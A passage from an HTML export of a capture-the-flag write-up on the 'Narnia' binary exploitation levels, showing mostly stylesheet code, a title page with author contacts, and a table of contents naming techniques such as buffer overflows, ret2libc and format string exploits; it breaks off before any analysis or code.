"}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_cc5tud1vde9p-7>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-7,lower-latin) ". "}.lst-kix_7jxhi2va7kgl-0>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-0}ol.lst-kix_j6urpnclzr2v-3.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-3 0}.lst-kix_3cbw9prsclrp-2>li{counter-increment:lst-ctn-kix_3cbw9prsclrp-2}.lst-kix_cc5tud1vde9p-5>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-5}.lst-kix_7jxhi2va7kgl-6>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-6}.lst-kix_j6urpnclzr2v-7>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-7}ol.lst-kix_3cbw9prsclrp-0.start{counter-reset:lst-ctn-kix_3cbw9prsclrp-0 0}ol.lst-kix_4odmxee0jpwg-3.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-3 0}.lst-kix_j6urpnclzr2v-1>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-1}ol{margin:0;padding:0}table td,table th{padding:0}.c71{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;background-color:#f8f8f8;border-left-style:solid;border-bottom-width:0pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c18{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;background-color:#22221b;border-left-style:solid;border-bottom-width:0pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c35{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:234pt;border-top-color:#000000;border-bottom-style:solid}.c47{padding-top:20pt;border-bottom-color:#000000;border-bottom-width:1pt;padding-bottom:2pt;line-height:1.5;border-bottom-style:solid;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c34{background-color:#f8f8f8;color:#333333;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Consolas";font-style:normal}.c33{color:#980000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:42pt;font-family:"Roboto Mono";font-style:normal}.c51{margin-left:18pt;padding-top:3pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c15{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:"Arial";font-style:normal}.c53{margin-left:72pt;padding-top:3pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c16{color:#936ec1;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:12.5pt;font-family:"Roboto Mono";font-style:normal}.c21{padding-top:8pt;padding-bottom:2pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c5{color:#516d7b;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:14pt;font-family:"Roboto Mono";font-style:normal}.c1{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Roboto Mono";font-style:normal}.c23{padding-top:0pt;padding-bottom:0pt;line-height:0.6;orphans:2;widows:2;text-align:left;height:11pt}.c17{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:12pt;font-family:"Roboto Mono";font-style:normal}.c85{padding-top:2pt;padding-bottom:0pt;line-height:0.6;orphans:2;widows:2;text-align:left;height:12pt}.c20{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:13pt;font-family:"Arial";font-style:normal}.c30{color:#6aa84f;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:12pt;font-family:"Roboto Mono";font-style:normal}.c13{margin-left:36pt;padding-top:3pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c43{margin-left:54pt;padding-top:3pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c28{padding-top:0pt;padding-bottom:0pt;line-height:0.5;orphans:2;widows:2;text-align:left;height:11pt}.c58{padding-top:2pt;padding-bottom:0pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c10{padding-top:20pt;padding-bottom:3pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c32{padding-top:0pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c40{color:#0b5394;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-style:normal}.c70{padding-top:0pt;padding-bottom:0pt;line-height:0.06;orphans:2;widows:2;text-align:left}.c25{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:center}.c57{padding-top:4pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c77{padding-top:10pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c65{padding-top:10pt;padding-bottom:4pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c48{padding-top:6pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:center}.c82{padding-top:10pt;padding-bottom:6pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c92{padding-top:10pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:center}.c64{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:right}.c90{padding-top:0pt;padding-bottom:0pt;line-height:0.5;orphans:2;widows:2;text-align:justify}.c91{padding-top:0pt;padding-bottom:3pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c74{color:#073763;text-decoration:none;vertical-align:baseline;font-size:18pt;font-style:normal}.c26{padding-top:0pt;padding-bottom:0pt;line-height:0.6;text-align:left;height:11pt}.c7{padding-top:0pt;padding-bottom:0pt;line-height:1.15;text-align:left;height:11pt}.c52{color:#4a86e8;text-decoration:none;vertical-align:baseline;font-size:19pt;font-style:normal}.c56{color:#0b5394;text-decoration:none;vertical-align:baseline;font-size:18pt;font-style:normal}.c76{color:#6aa84f;text-decoration:none;vertical-align:baseline;font-size:11.5pt;font-style:normal}.c24{border-spacing:0;border-collapse:collapse;margin-right:auto}.c37{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:center}.c50{text-decoration:none;vertical-align:baseline;font-family:"Arial";font-style:italic}.c8{background-color:#22221b;font-family:"Consolas";color:#ae7313;font-weight:400}.c6{background-color:#22221b;font-family:"Consolas";color:#5f9182;font-weight:400}.c39{background-color:#22221b;font-family:"Consolas";color:#878573;font-weight:400}.c38{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c84{color:#4a86e8;text-decoration:none;vertical-align:baseline;font-style:normal}.c19{padding-top:0pt;padding-bottom:0pt;line-height:1.15;text-align:left}.c11{background-color:#22221b;font-family:"Consolas";color:#7d9726;font-weight:400}.c62{text-decoration:none;vertical-align:baseline;font-size:16pt;font-style:normal}.c3{background-color:#22221b;font-family:"Consolas";color:#929181;font-weight:400}.c41{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c4{background-color:#22221b;font-family:"Consolas";color:#36a166;font-weight:400}.c59{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.c44{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c78{text-decoration:none;vertical-align:baseline;font-size:12pt;font-style:normal}.c12{background-color:#22221b;font-family:"Consolas";color:#ba6236;font-weight:400}.c45{text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c88{color:#666666;text-decoration:none;vertical-align:baseline}.c68{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c87{text-decoration:none;vertical-align:baseline;font-style:normal}.c60{background-color:#f8f8f8;font-family:"Consolas";color:#333333}.c66{margin-left:36pt;padding-left:0pt}.c9{margin-left:72pt;padding-left:0pt}.c89{font-size:9pt;color:#4a86e8}.c86{color:#333333;font-family:"Consolas"}.c69{width:33%;height:1px}.c14{color:inherit;text-decoration:inherit}.c42{padding:0;margin:0}.c49{font-weight:400}.c67{font-size:14pt}.c72{font-size:16pt}.c63{height:16pt}.c73{font-weight:300}.c54{font-style:italic}.c79{height:23.5pt}.c61{font-family:"Arial"}.c80{font-size:18pt}.c55{margin-left:72pt}.c22{height:0pt}.c31{font-size:10pt}.c81{color:#073763}.c46{color:#000000}.c75{page-break-after:avoid}.c83{font-size:11pt}.c29{height:11pt}.c27{font-weight:700}.c36{font-family:"Roboto Mono"}.title{padding-top:10pt;color:#980000;font-size:42pt;padding-bottom:0pt;font-family:"Roboto Mono";line-height:1.0;page-break-after:avoid;orphans:2;widows:2;text-align:center}.subtitle{padding-top:6pt;color:#666666;font-size:13pt;padding-bottom:0pt;font-family:"Roboto Mono";line-height:1.3;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:center}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#0b5394;font-size:16pt;padding-bottom:3pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:20pt;color:#0b5394;font-size:16pt;padding-bottom:3pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:20pt;color:#516d7b;font-size:14pt;padding-bottom:3pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:8pt;color:#936ec1;font-size:12.5pt;padding-bottom:2pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:2pt;color:#6aa84f;font-size:12pt;padding-bottom:0pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c68"><div><h1 class="c10 c63" id="h.li0bjdopo6z"><span class="c40 c36"></span></h1></div><p class="c92 title" id="h.nj23sjpj5u97"><span class="c33">Narnia</span></p><p class="c48 subtitle" id="h.dw2dac9r7xzm"><span class="c67">An analysis on the exploitation of vulnerable binaries.</span></p><p class="c44 c55"><span class="c49 c36 c89">&nbsp; &nbsp;</span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 345.92px; height: 358.88px;"><img alt="" src="images/image9.png" style="width: 345.92px; height: 358.88px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c59"><span class="c49 c80 c81 c36">0xd4y</span></p><p class="c59"><span class="c49 c36 c72">April</span><span class="c62 c49 c46 c36">&nbsp;22, 2021</span></p><p class="c0 c29"><span class="c20"></span></p><p class="c91"><span class="c62 c49 c36 c81">0xd4y Writeups</span></p><p class="c0"><span class="c27 c36">LinkedIn: </span><span class="c38 c49 c36"><a class="c14" href="https://www.google.com/url?q=https://www.linkedin.com/in/segev-eliezer/&amp;sa=D&amp;source=editors&amp;ust=1653862984558652&amp;usg=AOvVaw1JksxnKhCZdIQLLPjaAdei">https://www.linkedin.com/in/segev-eliezer/</a></span><span class="c49 c46 c36 c78">&nbsp;</span></p><p class="c0"><span class="c27 c36">Email: </span><span class="c38 c49 c36"><a class="c14" href="mailto:0xd4yWriteups@gmail.com">0xd4yWriteups@gmail.com</a></span></p><p class="c0"><span class="c27 c36">Web:</span><span class="c36 c49">&nbsp;</span><span class="c38 c49 c36"><a class="c14" href="https://www.google.com/url?q=https://0xd4y.github.io/Writeups/&amp;sa=D&amp;source=editors&amp;ust=1653862984559588&amp;usg=AOvVaw0r9GLF72jsSxJddztkdbfS">https://0xd4y.github.io/</a></span><span class="c49 c36">&nbsp;</span></p><p class="c48 c75 subtitle" id="h.uzriz95hwg4"><span class="c49 c72 c54 c36 c88">Table of Contents</span></p><p class="c57"><span class="c45 c46 c27 c36"><a class="c14" href="#h.ip86uerwz5x0">Executive Summary</a></span><span class="c45 c46 c27 c36">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c45 c46 c27 c36"><a class="c14" href="#h.ip86uerwz5x0">3</a></span></p><p class="c77"><span class="c45 c46 c27 c36"><a class="c14" href="#h.1v4pnj65xmth">Attack Narrative</a></span><span class="c45 c46 c27 c36">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c45 c46 c27 c36"><a class="c14" href="#h.1v4pnj65xmth">4</a></span></p><p class="c51"><span class="c1"><a class="c14" href="#h.es2smgb3v3t5">Narnia 0</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.es2smgb3v3t5">4</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.aua361lc1ay">Binary Analysis</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.aua361lc1ay">4</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.hjua9cypbazu">Buffer Overflow</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.hjua9cypbazu">5</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.faqz5avaj4l1">Source Code</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.faqz5avaj4l1">7</a></span></p><p class="c51"><span class="c2"><a class="c14" href="#h.8oz60692a7cl">Narnia 1</a></span><span class="c2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c2"><a class="c14" href="#h.8oz60692a7cl">8</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.lt9yn9n3bj0q">Binary Analysis</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.lt9yn9n3bj0q">8</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.f521hvia84ja">Exporting Shellcode into the Environment Variable</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.f521hvia84ja">9</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.z2yo1owiuxq5">Source Code</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.z2yo1owiuxq5">10</a></span></p><p class="c51"><span class="c1"><a class="c14" href="#h.e4mp3rcoeyar">Narnia 2</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.e4mp3rcoeyar">11</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.y4f2ngky9lgd">Binary Analysis</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.y4f2ngky9lgd">12</a></span></p><p class="c43"><span class="c1"><a class="c14" href="#h.p5qp0v2f6sef">Calculating EIP Offset</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.p5qp0v2f6sef">13</a></span></p><p class="c53"><span class="c1"><a class="c14" href="#h.6f0mxmx57b85">How the Buffer Relates to the Stack</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.6f0mxmx57b85">14</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.9gl2y6eg1cdw">Constructing a Payload</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.9gl2y6eg1cdw">16</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.jqrye1p9mibs">Binary Exploitation</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.jqrye1p9mibs">17</a></span></p><p class="c43"><span class="c1"><a class="c14" href="#h.ifkxhsp30btt">POC</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.ifkxhsp30btt">17</a></span></p><p class="c43"><span class="c1"><a class="c14" href="#h.btcg0ydv7z1y">Exploiting the Binary on the Target</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.btcg0ydv7z1y">18</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.f5q3c5hy51ko">Source Code</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.f5q3c5hy51ko">20</a></span></p><p class="c51"><span class="c1"><a class="c14" href="#h.ya2tytmk5a6">Narnia 3</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.ya2tytmk5a6">21</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.9bmlxskadml">Attempting to Read Passwords from the Stack Pointer</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.9bmlxskadml">21</a></span></p><p class="c43"><span class="c1"><a class="c14" href="#h.uwcd8r4kpbx9">Security Behind SUID Debugging</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.uwcd8r4kpbx9">23</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.j60l4ds1ohcj">Binary Analysis</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.j60l4ds1ohcj">23</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.koxo6w7ztt2h">Exploiting strcpy</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.koxo6w7ztt2h">25</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.65h64uhj8erp">Source Code</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.65h64uhj8erp">27</a></span></p><p class="c51"><span class="c1"><a class="c14" href="#h.125dslwuwfyp">Narnia 4</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.125dslwuwfyp">28</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.yp19zv417s7">Binary Analysis</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.yp19zv417s7">28</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.cupgylaegp6p">Binary Exploitation</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.cupgylaegp6p">29</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.q1ltbnf2eoc8">Source Code</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.q1ltbnf2eoc8">32</a></span></p><p class="c51"><span class="c1"><a class="c14" href="#h.n6g8yeh9n8qz">Narnia 5</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.n6g8yeh9n8qz">33</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.p5cduqaaxxju">Binary Analysis</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.p5cduqaaxxju">33</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.or0vns1b426t">Format String Exploit</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.or0vns1b426t">35</a></span></p><p class="c43"><span class="c1"><a class="c14" href="#h.1d69hbczxii5">POC</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.1d69hbczxii5">35</a></span></p><p class="c43"><span class="c1"><a class="c14" href="#h.yykxe27qf77w">Controlling Variable Value</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.yykxe27qf77w">36</a></span></p><p class="c53"><span class="c1"><a class="c14" href="#h.tfreh8cbxghu">Method 1</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.tfreh8cbxghu">36</a></span></p><p class="c53"><span class="c1"><a class="c14" href="#h.1dxm4wj8e7ar">Method 2</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.1dxm4wj8e7ar">37</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.bro9vn3stiqu">Source Code</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.bro9vn3stiqu">37</a></span></p><p class="c51"><span class="c1"><a class="c14" href="#h.2kucwybj5f6g">Narnia 6</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.2kucwybj5f6g">38</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.8051n9d3n5mc">Binary Analysis</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.8051n9d3n5mc">38</a></span></p><p class="c43"><span class="c1"><a class="c14" href="#h.k1z5nw3t7i3p">Behavior</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.k1z5nw3t7i3p">38</a></span></p><p class="c43"><span class="c1"><a class="c14" href="#h.dpcv8d85ball">Ghidra</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.dpcv8d85ball">38</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.dvw7b326b9wv">Ret2libc Attack</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.dvw7b326b9wv">40</a></span></p><p class="c43"><span class="c1"><a class="c14" href="#h.dvmc1o6n9rdl">POC</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.dvmc1o6n9rdl">40</a></span></p><p class="c43"><span class="c1"><a class="c14" href="#h.3qizfr8tqpd0">Determining System Address</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.3qizfr8tqpd0">41</a></span></p><p class="c43"><span class="c1"><a class="c14" href="#h.j51clcuxsbhy">Exploit</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.j51clcuxsbhy">43</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.kz3mi2kchbqk">Source Code</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.kz3mi2kchbqk">44</a></span></p><p class="c51"><span class="c1"><a class="c14" href="#h.v80flpijk1ef">Narnia 7</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.v80flpijk1ef">45</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.ig8xq2hea5tr">Binary Analysis</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.ig8xq2hea5tr">45</a></span></p><p class="c43"><span class="c1"><a class="c14" href="#h.h2wztyt0doyp">Behavior</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.h2wztyt0doyp">45</a></span></p><p class="c43"><span class="c1"><a class="c14" href="#h.ljfvw3fuhsaq">Ghidra</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.ljfvw3fuhsaq">46</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.j683xnn6p9mj">Format String Exploit</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.j683xnn6p9mj">46</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.kisnd3uzx3yn">Source Code</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.kisnd3uzx3yn">47</a></span></p><p class="c51"><span class="c1"><a class="c14" href="#h.2cvhcmtmn70t">Narnia 8</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.2cvhcmtmn70t">49</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.v7t5s7tgs2x2">Binary Analysis</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.v7t5s7tgs2x2">49</a></span></p><p class="c43"><span class="c1"><a class="c14" href="#h.wb361gqlsxjo">Ghidra</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.wb361gqlsxjo">49</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.ihr6gj74lno1">Buffer Overflow</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.ihr6gj74lno1">51</a></span></p><p class="c43"><span class="c1"><a class="c14" href="#h.closiciqkdn5">Gdb</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.closiciqkdn5">51</a></span></p><p class="c53"><span class="c1"><a class="c14" href="#h.9w58qw4azn9y">Local_8 Address Behavior</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.9w58qw4azn9y">53</a></span></p><p class="c53"><span class="c1"><a class="c14" href="#h.j10h1qzdlbsf">Overwriting func Return Address</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.j10h1qzdlbsf">54</a></span></p><p class="c43"><span class="c1"><a class="c14" href="#h.7l78l8n3eh28">Shellcode</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" 